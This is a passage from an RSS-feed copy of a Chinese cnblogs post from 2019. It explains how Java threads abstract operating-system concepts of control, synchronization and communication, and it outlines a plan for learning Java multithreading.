&lt;li&gt;&lt;span&gt;&lt;strong&gt;对于Thread中的一些行为（以及从Object继承而来的），比如join、wait则相当于进程的通信；&lt;/strong&gt;&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;/div&gt;
&lt;p&gt;&lt;span&gt;简言之，Java中对操作系统中的进程的控制、同步、通信，都有抽象，当然对于Java线程来说，从编程的角度看，他的主宰不是操作系统而是我们程序员。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以说绕来绕去，即使我们说的是Java中的多线程，还是绕不开“控制、同步、通信”的概念。&lt;/span&gt;&lt;/p&gt;
&lt;div&gt;&lt;span&gt;&lt;a href=&quot;https://img2018.cnblogs.com/blog/897393/201902/897393-20190207123854950-1284412903.png&quot;&gt;&lt;img title=&quot;image_5c5bb68d_2e3d&quot; src=&quot;https://img2018.cnblogs.com/blog/897393/201902/897393-20190207123855451-2049855696.png&quot; alt=&quot;image_5c5bb68d_2e3d&quot; width=&quot;811&quot; height=&quot;176&quot; border=&quot;0&quot;/&gt;&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;Java多线程编程到底是什么&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;所以说了这么多，到底Java多线程编程到底是什么？我们前面说只有两个步骤“创建Thread 对象，使用Thread对象”&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;这两个部分是对线程本身的控制与处理，但是在使用Thread对象时，还有一个最重要的部分，也就是为什么我们要使用线程？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;还不是为了执行任务？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;&lt;strong&gt;所以说，任务的执行也是非常重要的代码，因为，多线程中的代码不再是简简单单的完成任务那么简单，因为如果涉及到共享资源的访问，所以就是涉及到进程同步的问题。&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以想要学习Java多线程，第一个部分，理解清楚Java对线程概念的抽象以及Thread支持的控制操作方法---也就是Thread类本身。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;第二个部分，理解清楚Java中同步的逻辑，也就是同步关键字的透彻理解。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;第三个部分，理解清楚Java对于线程通信的抽象，也就是相关方法比如wait 的逻辑&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;以上三个部分就是Java多线程的基础，如果真的彻底理解了，我相信任何人都可以写出正确的多线程代码。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;但是，谁会非要从炼钢开始造汽车？电脑城中组装电脑的店铺一大把，谁会自己组装一个CPU或者风扇？&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;发展到如今，Java也提供了更多的“工具类”，也不断有一些好的设计模式与理念产生，所以，想要真的成为大师，你还要学会用好各种工具，站在前人的肩膀上。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，多线程编程的学习如上内容。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在上篇中，对操作系统中关于进程线程的相关概念进行了简单介绍，以有助于下一步能够快速理解Thread抽象模型&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在中篇中，将会详细介绍Java的多线程编程基础。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;在下篇中将会对多线程编程中的经典模式、工具类进行简单介绍。   &lt;/span&gt;&lt;/p&gt;
&lt;/div&gt;
&lt;h3&gt;&lt;span&gt;总结&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;&lt;span&gt;Java线程与操作系统线程的概念是同根同源的，根本逻辑是一致的，如同你跟另外一个人，生物上看都是“人类“，尽管从另外的很多角度你们是千差万别的。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;操作系统是为了多程序（任务）的并发运行，所以有了进程抽象概念，为了程序内部更好的并发运行 ，所以有了线程的概念。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;他们都是围绕着并发、提高处理机利用率等目的，他们面对的问题也都是相似的，控制、同步、通信。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以Java线程也不例外，Java线程与操作系统关于并发程序进程的相关概念与解决思路也是相通的&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以Java线程对操作系统中的概念进行了抽象，通过Thread类提供的属性和方法，通过关键字，通过Object的通信方法，完成了对进程概念的完整描述。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;所以，回头再看操作系统中关于控制、同步、通信的内容，你又会觉得非常有帮助。&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;多线程的学习很复杂，如果只是知识点的学习记忆，其实毫无用处，因为首先你不会如此深入底层原语（比如直接使用wait），因为有太多封装好的类，所以很快你就会忘记了，对于深度封装的类，不了解基础又无法深入，所以根本就学不会多线程。  &lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;span&gt;以上纯属一家之言，如果有理解错误的地方，欢迎文明指正。&lt;/span&gt;&lt;/p&gt;

</description>
<pubDate>Sun, 10 Feb 2019 03:40:00 +0000</pubDate>
<dc:creator>noteless</dc:creator>
<og:description>Java多线程的概念，源自于操作系统的线程概念，可谓同根同源，但是具象上又是千差万别的，本文对Java多线程宏观上的概念进行了简单的介绍</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/noteless/p/10354673.html</dc:identifier>
</item>
</channel>
</rss>